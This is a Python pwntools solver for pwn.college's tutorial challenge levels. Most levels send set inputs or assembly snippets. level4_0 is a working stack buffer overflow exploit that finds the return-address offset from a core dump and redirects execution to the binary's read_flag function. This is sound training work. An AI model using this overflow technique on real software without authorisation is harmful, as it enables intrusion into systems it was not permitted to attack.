import pwn
import sys

from pwnlib.elf.corefile import CorefileFinder

pwn.context.log_level = 'error'
pwn.context.terminal = ['kitty']

class Level:
    def __init__(self, hostname):
        self.level = hostname.split('~')[1].replace('level-', '').replace('-','.').splitlines()[0] \
            if '~' in hostname \
            else hostname
        self.remote_process = f"/challenge/pwntools-tutorials-level{self.level}"
        self.local_process = f"binaries/pwntools-tutorials-level{self.level}"
        self.func_name = f"level{self.level.replace('.', '_')}"
        self.run = globals()[self.func_name]

def level0_0(level, p):
    pwn.context.binary = pwn.ELF(level.local_process)

    payload = b"pokemon"
    p.sendlineafter(b":)\n###\n", payload)
    print(p.recvline().decode())

def level1_0(level, p):
    pwn.context.binary = pwn.ELF(level.local_process)

    payload = pwn.p32(0xdeadbeef)
    p.sendlineafter(b":)\n###\n", payload)
    print(p.recvline().decode())

def level1_1(level, p):
    pwn.context.binary = pwn.ELF(level.local_process)

    payload = b'p\x15'
    payload += pwn.p32(123456789)
    payload += b"Bypass Me:)"
    p.sendlineafter(b":)\n###\n", payload)
    print(p.recvline().decode())

def level2_0(level, p):
    pwn.context(arch="amd64", os="linux", log_level="info")

    asm = pwn.asm("mov rax, 0x12345678")
    p.send(asm)
    print(p.recvall(timeout=1).decode())

def level2_1(level, p):
    pwn.context(arch="amd64", os="linux", log_level="info")

    asm = pwn.asm("xchg rax, rbx")
    p.send(asm)
    print(p.recvall(timeout=1).decode())

def level2_2(level, p):
    pwn.context(arch="amd64", os="linux", log_level="info")
    code = """
    idiv rbx
    add rdx, rcx
    sub rdx, rsi
    mov rax, rdx
    """

    asm = pwn.asm(code)
    p.send(asm)
    print(p.recvall(timeout=1).decode())

def level2_3(level, p):
    pwn.context(arch="amd64", os="linux", log_level="info")
    code = """
    mov rax, qword ptr [0x404000]
    mov qword ptr [0x405000], rax
    """

    asm = pwn.asm(code)
    p.send(asm)
    print(p.recvall(timeout=1).decode())

def level2_4(level, p):
    pwn.context(arch="amd64", os="linux", log_level="info")
    code = """
    pop rax
    sub rax, rbx
    push rax
    """

    asm = pwn.asm(code)
    p.send(asm)
    print(p.recvall(timeout=1).decode())

def level2_5(level, p):
    pwn.context(arch="amd64", os="linux", log_level="info")
    code = """
    pop rax
    cmp rax, 0
    jge done
    mov rbx, 0x100000000
    shl rbx, 32
    sub rbx, rax
    mov rax, rbx
    done:
    push rax
    """

    asm = pwn.asm(code)
    p.send(asm)
    print(p.recvall(timeout=1).decode())

def level2_6(level, p):
    pwn.context(arch="amd64", os="linux", log_level="info")
    code = """
    mov rbx, 0
    loop:
    add rbx, rcx
    sub rcx, 1
    cmp rcx, 0
    jg loop
    mov rax, rbx
    """

    asm = pwn.asm(code)
    p.send(asm)
    print(p.recvall(timeout=1).decode())

def level3_0(level, p):

    p.sendlineafter(b"Choice >> \n", b"1")
    p.sendlineafter(b"index:", b"0")
    p.sendafter(b"content:", b"hello ")

    p.sendlineafter(b"Choice >> \n", b"1")
    p.sendlineafter(b"index:", b"1")
    p.sendafter(b"content:", b"world,")

    p.sendlineafter(b"Choice >> \n", b"1")
    p.sendlineafter(b"index:", b"3")
    p.sendafter(b"content:", b"magic ")

    p.sendlineafter(b"Choice >> \n", b"1")
    p.sendlineafter(b"index:", b"5")
    p.sendafter(b"content:", b"notebook")

    p.sendlineafter(b"Choice >> \n", b"2")
    p.sendlineafter(b"index:", b"1")

    p.sendlineafter(b"Choice >> \n", b"2")
    p.sendlineafter(b"index:", b"5")

    p.sendlineafter(b"Choice >> \n", b"5")

    print(p.recvall(timeout=1).decode())


def level4_0(level, p):

    payload = get_payload(level)

    print(p.sendlineafter(b"input\n", payload).decode())
    print(p.recvall(timeout=1).decode())

def get_payload(level):
    p = pwn.process(level.local_process)
    elf = pwn.context.binary = pwn.ELF(level.local_process)

    payload = pwn.cyclic(256)
    p.sendlineafter(b"input\n", payload)
    print(p.recvline().decode())
    p.wait_for_close()

    c = CorefileFinder(p)
    core = pwn.Coredump(c.systemd_coredump_corefile())

    print(f"RSP: {hex(core.rsp)}")
    stack_data = core.read(core.rsp, 8)
    print(f"Data: {stack_data.hex()}")
    assert stack_data in payload
    payload = pwn.fit({
        pwn.cyclic_find(stack_data): elf.symbols.read_flag
    })

    return payload

def get_level(r):
    p = r.process("hostname")
    hostname = p.recvall(timeout=1).decode()
    level = Level(hostname)
    print(f"LEVEL {level.level}")
    return level

if __name__ == '__main__':
    if len(sys.argv) == 3 and sys.argv[1] == 'local':
        level = Level(sys.argv[2])
        p = pwn.process(level.local_process, aslr=False)

    elif len(sys.argv) >= 4 and sys.argv[1] == 'dbg':
        level = Level(sys.argv[2])
        gdbscript = []
        for arg in sys.argv[3:]:
            gdbscript.append(arg)
        gdbscript = '\n'.join(gdbscript)
        p = pwn.gdb.debug(level.local_process, gdbscript=gdbscript, stdin=pwn.PTY, stdout=pwn.PTY, aslr=False)

    elif sys.argv[1] == 'remote':
        r = pwn.ssh(user="hacker", host="pwn.college", keyfile="~/.ssh/pwn.college")
        level = get_level(r)
        p = r.process(level.remote_process)

    elif sys.argv[1] == 'local':
        r = pwn.ssh(user="hacker", host="pwn.college", keyfile="~/.ssh/pwn.college")
        level = get_level(r)
        p = pwn.process(f"binaries/pwntools-tutorials-level{level.level}")

    else:
        print(f"Usage: {sys.argv[0]} <remote|local> (level)")
        exit()

    with p:
        level.run(level, p)

